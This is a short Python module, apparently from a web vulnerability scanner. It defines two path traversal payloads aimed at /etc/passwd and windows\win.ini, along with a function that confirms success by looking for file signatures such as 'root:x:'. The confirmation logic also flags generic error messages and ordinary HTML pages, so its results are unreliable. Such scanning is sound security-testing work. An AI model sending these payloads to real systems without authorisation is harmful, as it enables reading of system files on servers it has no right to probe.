from .base import Payload

def traversal_confirm(response_text: str) -> bool:
    # Positive indicators (successful traversal)
    success_indicators = [
        "root:x:",                    # Linux /etc/passwd
        "bin/bash",                   # Linux /etc/passwd
        "[boot loader]",              # Windows boot.ini
        "[extensions]",               # Some Windows configs
        "[fonts]",                   # Some Windows configs
        "<?xml",                     # Config files
        "application/x-httpd-php",    # Source code disclosure
        "<!DOCTYPE html",            # HTML files
    ]
    
    # Negative indicators (error messages - might still indicate vulnerability)
    error_indicators = [
        "no such file or directory",
        "permission denied",
        "access denied",
        "could not find"
    ]
    
    text_lower = response_text.lower()
    has_success = any(indicator.lower() in text_lower for indicator in success_indicators)
    has_error = any(indicator.lower() in text_lower for indicator in error_indicators)
    
    # If we see success indicators OR if we get a different error than baseline
    return has_success or has_error

TRAVERSAL_PAYLOADS = [
    Payload(
        vuln_type="PathTraversal",
        name="Linux passwd",
        payload="../../../../etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Windows win.ini",
        payload="..\\..\\..\\..\\windows\\win.ini",
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=traversal_confirm
    )
]
